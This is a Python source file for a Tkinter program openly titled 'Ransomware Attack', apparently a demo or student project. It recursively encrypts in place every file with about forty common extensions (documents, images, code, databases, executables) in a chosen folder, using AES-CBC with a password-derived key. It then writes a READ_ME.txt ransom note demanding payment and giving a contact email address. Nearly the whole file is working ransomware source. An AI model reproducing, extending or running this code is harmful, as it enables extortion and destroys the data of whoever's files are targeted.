import os
import tkinter as tk
from tkinter import filedialog, messagebox
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

TARGET_EXTENSIONS = [".txt", ".docx", ".pdf", ".xlsx", ".png", ".jpg", ".jpeg", ".mp4", ".mp3", ".csv", ".pptx", ".ppt", ".py", ".js", ".html", ".css", ".cpp", ".c", ".wav", ".java", ".zip", ".rar", ".psd", ".bat", ".sh", ".php", ".webp", ".bmp", ".gif", ".sql", ".sqlite", ".mdb", ".bin", ".exe", ".iso", ".json", ".xml", ".yaml", ".xls", ".doc"]
RANSOM_NOTE = "YOUR FILES ARE ENCRYPTED. Pay to unlock. Contact: sachinkumarpandey1028@gmail.com"

class RansomwareGUI:
    def __init__(self, master):
        self.master = master
        master.title("Ransomware Attack")
        master.geometry("500x400")  # Adjusted window size for better layout
        master.config(bg="black")  # Dark background for hacker feel

        # Create GUI elements with improved style
        self.folder_path = tk.StringVar()
        self.password = tk.StringVar()
        self.mode = tk.StringVar(value="encrypt")

        # Using a monospaced font for hacker-like feel
        font_style = ("Courier New", 12)

        # Header Label
        self.header = tk.Label(master, text="Ransomware Attack", font=("Courier New", 18), fg="green", bg="black")
        self.header.pack(pady=10)

        # Target Folder Section
        tk.Label(master, text="Target Folder", font=font_style, fg="green", bg="black").pack()
        tk.Entry(master, textvariable=self.folder_path, font=font_style, width=40).pack(pady=5)
        tk.Button(master, text="Browse", font=font_style, command=self.browse_folder, bg="green", fg="black").pack(pady=5)

        # Password Section
        tk.Label(master, text="Password", font=font_style, fg="green", bg="black").pack()
        tk.Entry(master, textvariable=self.password, font=font_style, show="*", width=40).pack(pady=5)

        # Mode Selection (Encrypt / Decrypt)
        tk.Label(master, text="Mode", font=font_style, fg="green", bg="black").pack()
        tk.Radiobutton(master, text="Encrypt", variable=self.mode, value="encrypt", font=font_style, fg="green", bg="black", selectcolor="green").pack()
        tk.Radiobutton(master, text="Decrypt", variable=self.mode, value="decrypt", font=font_style, fg="green", bg="black", selectcolor="green").pack()

        # Start Button
        tk.Button(master, text="Start", font=font_style, command=self.start_process, bg="red", fg="black").pack(pady=10)

        # Status Label
        self.status = tk.Label(master, text="", font=font_style, fg="blue", bg="black")
        self.status.pack(pady=5)

    def browse_folder(self):
        path = filedialog.askdirectory()
        if path:
            self.folder_path.set(path)

    def start_process(self):
        folder = self.folder_path.get()
        password = self.password.get()
        mode = self.mode.get()

        if not folder or not password:
            messagebox.showwarning("Input Error", "Folder and Password are required!")
            return

        salt = b'static_salt_1234'  # Hardcoded salt, use random salt in production
        key = self.derive_key(password, salt)

        self.status.config(text="Processing...")

        for root, _, files in os.walk(folder):
            for file in files:
                if any(file.endswith(ext) for ext in TARGET_EXTENSIONS):
                    full_path = os.path.join(root, file)
                    try:
                        if mode == "encrypt":
                            self.encrypt_file(full_path, key)
                        else:
                            self.decrypt_file(full_path, key)
                    except Exception as e:
                        messagebox.showerror("Error", f"Error processing file {file}: {e}")
                        continue

        if mode == "encrypt":
            self.drop_ransom_note(folder)

        self.status.config(text=f"{mode.title()}ion completed.")
        messagebox.showinfo("Process Completed", f"{mode.title()}ion completed.")

    def derive_key(self, password, salt):
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=default_backend()
        )
        return kdf.derive(password.encode())

    def encrypt_file(self, path, key):
        iv = os.urandom(16)  # Dynamically generated IV for encryption
        with open(path, "rb") as f:
            data = f.read()

        # Padding the data to make it a multiple of block size (AES block size is 128 bits)
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(data) + padder.finalize()

        # Encrypt the data using AES CBC mode
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

        # Write encrypted data back to the file, including the IV at the start
        with open(path, "wb") as f:
            f.write(iv + encrypted_data)  # Prepend IV to the encrypted data

    def decrypt_file(self, path, key):
        with open(path, "rb") as f:
            file_data = f.read()

        iv = file_data[:16]  # Extract the first 16 bytes as the IV
        encrypted_data = file_data[16:]  # The rest is the encrypted data

        # Decrypt the data using AES CBC mode
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        padded_data = decryptor.update(encrypted_data) + decryptor.finalize()

        # Remove padding from the decrypted data
        unpadder = padding.PKCS7(128).unpadder()
        decrypted_data = unpadder.update(padded_data) + unpadder.finalize()

        # Write the decrypted data back to the file
        with open(path, "wb") as f:
            f.write(decrypted_data)

    def drop_ransom_note(self, folder):
        note_path = os.path.join(folder, "READ_ME.txt")
        with open(note_path, "w") as f:
            f.write(RANSOM_NOTE)

# Run the GUI app
if __name__ == "__main__":
    root = tk.Tk()
    app = RansomwareGUI(root)
    root.mainloop()
